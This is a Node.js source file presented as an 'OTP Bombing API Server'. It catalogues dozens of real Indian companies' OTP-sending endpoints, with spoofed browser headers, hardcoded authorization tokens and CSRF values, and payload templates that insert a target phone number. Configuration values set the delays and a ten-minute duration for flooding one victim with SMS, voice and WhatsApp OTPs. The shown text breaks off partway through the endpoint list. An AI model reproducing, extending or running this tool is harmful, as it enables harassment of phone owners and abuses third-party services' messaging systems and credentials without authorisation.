// ============================================================
// api_server.js - OTP Bombing API Server (FINAL - 101 APIs)
// 101 APIs | Rate Limited Kam Call | 10min Cap | Logs | Delay
// + 6 New Verified Working APIs (200 OK Tested)
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// 🔥 CONFIGURATION
const MAX_DURATION_MIN = 10;
const BATCH_DELAY_MS = 100;
const API_DELAY_MS = 50;
const RATE_LIMIT_SKIP = 5;

// ============================================================
// ===== ALL APIS (101 Total) =====
// ============================================================

const APIS = [
    // ============================================================
    // ⭐ TIER 0 — 6 NEW VERIFIED WORKING APIs (200 OK Tested)
    // ============================================================
    {
        name: "Hungama_Verified",
        url: "https://communication.api.hungama.com/v1/communication/otp",
        method: "POST",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "identifier": "home",
            "mlang": "en",
            "country_code": "IN",
            "origin": "https://www.hungama.com",
            "referer": "https://www.hungama.com/"
        },
        data: (phone) => JSON.stringify({
            mobileNo: phone,
            countryCode: "+91",
            appCode: "un",
            messageId: "1",
            emailId: "",
            subject: "Register",
            priority: "1",
            device: "web",
            variant: "v1",
            templateCode: 1
        })
    },
    {
        name: "NoBroker_Verified",
        url: "https://www.nobroker.in/api/v3/account/otp/send",
        method: "POST",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "origin": "https://www.nobroker.in",
            "referer": "https://www.nobroker.in/"
        },
        data: { "_raw": "phone={phone}&countryCode=IN" }
    },
    {
        name: "TataCapital_Verified",
        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone, applSource: "", isOtpViaCallAtLogin: "true" })
    },
    {
        name: "Swiggy_Verified",
        url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
        method: "POST",
        headers: {
            "user-agent": "Swiggy-Android",
            "content-type": "application/json; charset=utf-8"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Servetel_Verified",
        url: "https://api.servetel.in/v1/auth/otp",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13)"
        },
        data: { "_raw": "mobile_number={phone}" }
    },
    {
        name: "KPNFresh_Verified",
        url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        method: "POST",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "content-type": "application/json",
            "origin": "https://www.kpnfresh.com",
            "referer": "https://www.kpnfresh.com/"
        },
        data: (phone) => JSON.stringify({ phone_number: { number: phone, country_code: "+91" } })
    },

    // ============================================================
    // 🟢 TIER 1 — OLD RELIABLE (6 APIs) — Normal
    // ============================================================
    {
        name: "GetInstaCash",
        method: "POST",
        url: "https://getinstacash.in/sell/getData.php",
        headers: {
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://getinstacash.in",
            "Referer": "https://getinstacash.in/sell/login"
        },
        data: { "_raw": "type=sendOTP&mobile={phone}" }
    },
    {
        name: "Flipkart_2",
        method: "GET",
        url: "https://img1a.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "Accept": "*/*",
            "Referer": "https://www.flipkart.com/login/verify?type=mobile&verificationType=otp&loginIdentifier={phone}&loginIdentifierPrefix=%2B91&sourceContext=default"
        }
    },
    {
        name: "AakashDigital_2",
        method: "POST",
        url: "https://digital.aakash.ac.in/signup-otp-verify",
        headers: {
            "accept": "*/*",
            "origin": "https://digital.aakash.ac.in",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://digital.aakash.ac.in/user/register"
        },
        data: { "_raw": "&mobileval={phone}" }
    },
    {
        name: "RedBus_1",
        method: "GET",
        url: "https://m.redbus.in/api/getOtp?number={phone}&cc=91&whatsAppOpted=undefined",
        headers: {
            "accept": "application/json, text/plain, */*",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "referer": "https://m.redbus.in/preregister"
        }
    },
    {
        name: "Snapdeal",
        method: "POST",
        url: "https://m.snapdeal.com/signupCompleteAjax",
        headers: {
            "xc": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19",
            "h2": "true",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "xg": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "u": "160081122259159083",
            "accept": "*/*",
            "origin": "https://m.snapdeal.com",
            "referer": "https://m.snapdeal.com/signin"
        },
        data: { "_raw": "j_password=null&j_mobilenumber={phone}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy" }
    },
    {
        name: "Quikr",
        method: "POST",
        url: "https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "accept": "*/*",
            "origin": "https://www.quikr.com",
            "referer": "https://www.quikr.com/"
        },
        data: { "_raw": "user={phone}&v3=true" }
    },

    // ============================================================
    // 🟡 TIER 2 — OLD PURANI WORKING (5 APIs) — Normal
    // ============================================================
    {
        name: "Tata Capital Voice",
        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone, isOtpViaCallAtLogin: "true" })
    },
    {
        name: "Ogonn",
        method: "POST",
        url: "https://ogonn.in/otp",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "origin": "https://ogonn.in",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://ogonn.in/login"
        },
        data: { "_raw": "_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={phone}" }
    },
    {
        name: "AakashDigital_1",
        method: "POST",
        url: "https://digital.aakash.ac.in/mkt-signup-otp-verify",
        headers: {
            "accept": "*/*",
            "origin": "https://digital.aakash.ac.in",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://digital.aakash.ac.in/"
        },
        data: { "_raw": "&mobileval={phone}&otp=6230" }
    },
    {
        name: "Flipkart_1",
        method: "POST",
        url: "https://1.rome.api.flipkart.com/1/action/view",
        headers: {
            "x-user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile",
            "Origin": "https://www.flipkart.com",
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json",
            "Accept": "*/*",
            "Referer": "https://www.flipkart.com/login"
        },
        data: {
            "actionRequestContext": {
                "type": "LOGIN_IDENTITY_VERIFY",
                "loginIdPrefix": "+91",
                "loginId": "{phone}",
                "clientQueryParamMap": { "ret": "/?affid=siteplug&affExtParam1=e2f29ff2e3dd9e65eb9e419d30dc8135", "entryPage": "HOMEPAGE_HEADER_ACCOUNT" },
                "loginType": "MOBILE",
                "verificationType": "OTP",
                "screenName": "LOGIN_V4_MOBILE",
                "sourceContext": "DEFAULT"
            }
        }
    },
    {
        name: "Netmeds",
        method: "GET",
        url: "https://m.netmeds.com/mst/rest/v1/id/details/{phone}",
        headers: {
            "accept": "application/json, text/plain, */*",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "referer": "https://m.netmeds.com/customer/account/login"
        }
    },

    // ============================================================
    // 🟢 TIER 3 — OLD NAYI WORKING (5 APIs) — Normal
    // ============================================================
    {
        name: "Vedantu",
        method: "POST",
        url: "https://user.vedantu.com/user/preLoginVerification",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "accept": "*/*",
            "origin": "https://www.vedantu.com",
            "referer": "https://www.vedantu.com/"
        },
        data: { "email": null, "phoneCode": "+91", "phoneNumber": "{phone}", "ver": "11.345" }
    },
    {
        name: "KPN WhatsApp",
        url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        method: "POST",
        headers: { "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8" },
        data: (phone) => JSON.stringify({ notification_channel: "WHATSAPP", phone_number: { country_code: "+91", number: phone } })
    },
    {
        name: "Oyo_1",
        method: "POST",
        url: "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "text/plain;charset=UTF-8",
            "accept": "*/*",
            "origin": "https://www.oyorooms.com",
            "referer": "https://www.oyorooms.com/login"
        },
        data: { "phone": "{phone}", "country_code": "+91", "nod": 4 }
    },
    {
        name: "Ullu",
        method: "POST",
        url: "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={phone}",
        headers: {
            "accept": "application/json, text/plain, */*",
            "origin": "https://ullu.app",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "referer": "https://ullu.app/"
        },
        data: {}
    },
    {
        name: "Hungama OTP",
        url: "https://communication.api.hungama.com/v1/communication/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un" })
    },

    // ============================================================
    // 🆕 OLD NEW WORKING (4 APIs) — Normal
    // ============================================================
    {
        name: "Gokwik_3",
        method: "POST",
        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        headers: {
            "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzNTg0OCwiZXhwIjoxNzU3NDM1OTA4fQ._37TKeyXUxkMEEteU2IIVeSENo8TXaNv32x5rWaJbzA",
            "Content-Type": "application/json",
            "gk-merchant-id": "19g6ilhej3mfc"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "Gokwik_4",
        method: "POST",
        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        headers: {
            "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyMTM5OSwiZXhwIjoxNzU3NTIxNDU5fQ.XWlps8Al--idsLa1OYcGNcjgeRk5Zdexo2goBZc1BNA",
            "Content-Type": "application/json",
            "gk-merchant-id": "19kc37zcdyiu"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "Delhivery",
        method: "GET",
        url: "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={phone}",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "accept": "*/*"
        }
    },
    {
        name: "Vidyakul",
        method: "POST",
        url: "https://vidyakul.com/signup-otp/send",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        data: { "_raw": "phone={phone}&rcsconsent=true" }
    },

    // ============================================================
    // ⚠️  OLD RATE LIMITED (8 APIs) — Rate Limited (Kam Call)
    // ============================================================
    {
        name: "Gokwik_1",
        method: "POST",
        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        headers: {
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyNDY4NywiZXhwIjoxNzU3NTI0NzQ3fQ.xkq3U9_Z0nTKhidL6rZ-N8PXMJOD2jo6II-v3oCtVYo",
            "Content-Type": "application/json",
            "gk-merchant-id": "19g6im8srkz9y"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" }),
        rateLimit: true
    },
    {
        name: "Gokwik_2",
        method: "POST",
        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        headers: {
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzMzc1OCwiZXhwIjoxNzU3NDMzODE4fQ._L8MBwvDff7ijaweocA302oqIA8dGOsJisPydxytvf8",
            "Content-Type": "application/json",
            "gk-merchant-id": "19an4fq2kk5y"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" }),
        rateLimit: true
    },
    {
        name: "ApolloPharmacy",
        method: "POST",
        url: "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "mobile={phone}" },
        rateLimit: true
    },
    {
        name: "Goibibo",
        method: "POST",
        url: "https://www.goibibo.com/common/downloadsms/",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "mbl={phone}" },
        rateLimit: true
    },
    {
        name: "Nuvama",
        method: "POST",
        url: "https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ contactInfo: phone, mode: "SMS" }),
        rateLimit: true
    },
    {
        name: "Khatabook",
        method: "POST",
        url: "https://api.khatabook.com/v1/auth/request-otp",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ country_code: "+91", phone: phone, app_signature: "Jc/Zu7qNqQ2" }),
        rateLimit: true
    },
    {
        name: "Jockey",
        method: "GET",
        url: "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "accept": "*/*"
        },
        rateLimit: true
    },
    {
        name: "PharmEasy_NEW",
        method: "POST",
        url: "https://pharmeasy.in/api/auth/requestOTP",
        headers: {
            "Host": "pharmeasy.in",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
            "Accept": "*/*",
            "Content-Type": "application/json"
        },
        data: { "contactNumber": "{phone}" },
        rateLimit: true
    },

    // ============================================================
    // 🆕 NEW WORKING — 9 APIs — Normal
    // ============================================================
    {
        name: "JioSaavn",
        url: "https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://www.jiosaavn.com",
            "Referer": "https://www.jiosaavn.com/"
        },
        data: (phone) => JSON.stringify({ phone_number: "+91" + phone })
    },
    {
        name: "Naaptol",
        url: "https://www.naaptol.com/faces/jsp/ajax/ajax.jsp",
        method: "POST",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.naaptol.com",
            "pagesecuritytoken": "DE3NzMzMTY2NTY3NTZfVkBAcHRvbF83MzA1ODUyba",
            "referer": "https://www.naaptol.com/",
            "x-requested-with": "XMLHttpRequest"
        },
        data: (phone) => JSON.stringify({ actionname: "checkMobileUserExistsForTvApp", mobile: phone })
    },
    {
        name: "Zepto",
        url: "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Origin": "https://www.zepto.com",
            "Referer": "https://www.zepto.com/"
        },
        data: (phone) => JSON.stringify({ mobileNumber: phone })
    },
    {
        name: "TradeIndia",
        url: "https://apis.tradeindia.com/app_login_api/login_app",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json"
        },
        data: (phone) => JSON.stringify({ mobile: "+91" + phone })
    },
    {
        name: "Factori",
        url: "https://factori.com/login/check_user_exists",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "origin": "https://factori.com",
            "referer": "https://factori.com/my-account"
        },
        data: { "_raw": "mobNumber={phone}&countryCode=91" }
    },
    {
        name: "Smytten",
        url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phone: phone, email: "test@example.com" })
    },
    {
        name: "Tata Capital Business",
        url: "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ mobileNumber: phone, deviceOs: "Android", sourceName: "MitayeFaasleWebsite" })
    },
    {
        name: "Gokwik",
        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "gk-merchant-id": "19g6im8srkz9y"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "BharatLoan",
        url: "https://www.bharatloan.com/login-sbm",
        method: "POST",
        headers: {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.bharatloan.com",
            "Referer": "https://www.bharatloan.com/apply-now",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "mobile={phone}&current_page=login&is_existing_customer=2" }
    },

    // ============================================================
    // ⚠️  NEW RATE LIMITED — 6 APIs — Rate Limited
    // ============================================================
    {
        name: "AyushmanLoan",
        url: "https://backend.ayushmanloan.com/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://ayushmanloan.com",
            "Referer": "https://ayushmanloan.com/"
        },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone }),
        rateLimit: true
    },
    {
        name: "F1SpeedLoan",
        url: "https://backend.f1speedloan.com/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://f1speedloan.com",
            "Referer": "https://f1speedloan.com/"
        },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone }),
        rateLimit: true
    },
    {
        name: "RojgarKaro_Signup",
        url: "https://rojgarkaro.in/api/auth/sendOTPOnSignup",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://rojgarkaro.in",
            "Referer": "https://rojgarkaro.in/signup"
        },
        data: (phone) => JSON.stringify({ mobile_no: phone, email_id: "test@gmail.com", isSessionActive: false }),
        rateLimit: true
    },
    {
        name: "Udaan",
        url: "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "origin": "https://auth.udaan.com",
            "referer": "https://auth.udaan.com/login/v2/mobile?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2",
            "x-app-id": "udaan-auth"
        },
        data: { "_raw": "mobile={phone}" },
        rateLimit: true
    },
    {
        name: "PocketCredit",
        url: "https://pocketcredit.in/api/auth/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://pocketcredit.in",
            "Referer": "https://pocketcredit.in/auth"
        },
        data: (phone) => JSON.stringify({ mobile: phone }),
        rateLimit: true
    },
    {
        name: "Pagarbook",
        url: "https://api.pagarbook.com/api/v5/auth/otp/request",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "appversioncode": "5268",
            "clientbuildnumber": "5268",
            "clientplatform": "WEB",
            "content-type": "application/json",
            "origin": "https://web.pagarbook.com",
            "referer": "https://web.pagarbook.com/",
            "userrole": "EMPLOYER"
        },
        data: (phone) => JSON.stringify({ phone: phone, language: 1 }),
        rateLimit: true
    },

    // ============================================================
    // 🔥 NAYI UNTESTED APIs — Jo Logs Me Working Mili (24 APIs) — Normal
    // ============================================================
    {
        name: "Vedantu_New",
        url: "https://user.vedantu.com/user/preLoginVerification",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.vedantu.com",
            "referer": "https://www.vedantu.com/register"
        },
        data: (phone) => JSON.stringify({ email: null, phoneCode: "+91", phoneNumber: phone, sType: "VEDANTU_F_7_N", sValue: "FC34EE3ED23399CD7622BA1851D3E", token: "5nXaR2BzqApBb3Wf", ver: "1772629389", version: 2, whatsappCommunicationEnabled: false })
    },
    {
        name: "IndiaMart_New",
        url: "https://m.indiamart.com/ajaxrequest/identified/common/login",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://m.indiamart.com",
            "referer": "https://m.indiamart.com/login/"
        },
        data: (phone) => JSON.stringify({ GEOIP_COUNTRY_ISO: "IN", IP: "47.9.35.50", IPADDRESS: "47.9.35.50", IP_COUNTRY: "India", ciso: "IN", duplicateEmailCheck: "", glid: "", glusr_usr_ip: "47.9.35.50", originalreferer: "https://m.indiamart.com/login/", pass: "", ph_code: "91", use: phone })
    },
    {
        name: "JioSaavn_NEW",
        url: "https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://www.jiosaavn.com",
            "Referer": "https://www.jiosaavn.com/"
        },
        data: (phone) => JSON.stringify({ phone_number: "+91" + phone })
    },
    {
        name: "Wellness_Forever",
        url: "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: (phone) => ({ "_raw": `method=firstRegisterApi&data={"customerMobile":"${phone}","generateOtp":"true"}` })
    },
    {
        name: "Vidyakul_New",
        url: "https://vidyakul.com/signup-otp/send",
        method: "POST",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://vidyakul.com",
            "referer": "https://vidyakul.com/class-12th/test-series",
            "x-csrf-token": "el0GIsHQSO3Y4upLoQOm3coVWNEiNtiKJONg2LJx",
            "x-requested-with": "XMLHttpRequest"
        },
        data: { "_raw": "phone={phone}" }
    },
    {
        name: "Moglix",
        url: "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://www.moglix.com",
            "referer": "https://www.moglix.com/"
        },
        data: (phone) => JSON.stringify({ email: "", phone: phone, type: "p", source: "signup", buildVersion: "DESKTOP-7.3", device: "desktop" })
    },
    {
        name: "AstroSage",
        url: "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank",
        method: "GET",
        headers: {
            "accept": "*/*",
            "referer": "https://www.astrosage.com/"
        }
    },
    {
        name: "55Club",
        url: "https://api.55clubapi.com/api/webapi/SmsVerifyCode",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://55club08.in",
            "referer": "https://55club08.in/"
        },
        data: (phone) => JSON.stringify({ phone: "91" + phone, codeType: 1, language: 0, random: "35ae48f136d74b279dbd0eeb2504e7f8", signature: "78A2879A0D46B65D257F9B29354B5DBA", timestamp: 1715445820 })
    },
    {
        name: "TataCapital_Retail",
        url: "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.tatacapital.com",
            "referer": "https://www.tatacapital.com/"
        },
        data: (phone) => JSON.stringify({
            header: {
                authToken: "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==",
                identifier: "nli"
            },
            body: { mobileNumber: phone }
        })
    },
    {
        name: "Animall",
        url: "https://animall.in/zap/auth/login",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phone: phone, signupPlatform: "NATIVE_ANDROID" })
    },
    {
        name: "Swipe",
        url: "https://app.getswipe.in/api/user/mobile_login",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ mobile: phone, resend: true })
    },
    {
        name: "Myntra",
        url: "https://www.myntra.com/gateway/v1/auth/getotp",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.myntra.com",
            "referer": "https://www.myntra.com/login",
            "deviceid": "8b9a6835-e2e0-42ec-9e0f-290e5e7e5a6f",
            "x-myntraweb": "Yes",
            "x-requested-with": "browser",
            "x-location-context": "pincode=276304;source=IP",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        },
        data: (phone) => JSON.stringify({ phoneNumber: phone, signup: "ONECLICK" })
    },
    {
        name: "Wrogn",
        url: "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp",
        method: "POST",
        headers: {
            "accept": "*/*",
            "action": "sendOTP",
            "content-type": "application/json",
            "origin": "https://wrogn.com",
            "referer": "https://wrogn.com/",
